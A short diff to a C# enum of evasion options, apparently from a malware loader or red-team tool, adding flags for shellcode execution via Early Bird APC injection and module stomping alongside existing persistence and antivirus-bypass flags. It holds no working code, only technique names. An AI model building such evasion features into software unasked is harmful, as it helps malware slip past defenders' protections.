@@ -29,5 +29,9 @@ public enum EvasionOptions : uint
     PersistStartup = 1 << 14,
     /// <summary>Detect AV vendor at runtime and apply vendor-specific bypass set.</summary>
     AvSpecificBypass = 1 << 15,
+    /// <summary>Execute shellcode via Early Bird APC injection.</summary>
+    ExecuteEarlyBird = 1 << 16,
+    /// <summary>Execute shellcode via module stomping (overwrite DLL .text).</summary>
+    ExecuteModuleStomping = 1 << 17,
 }
 }
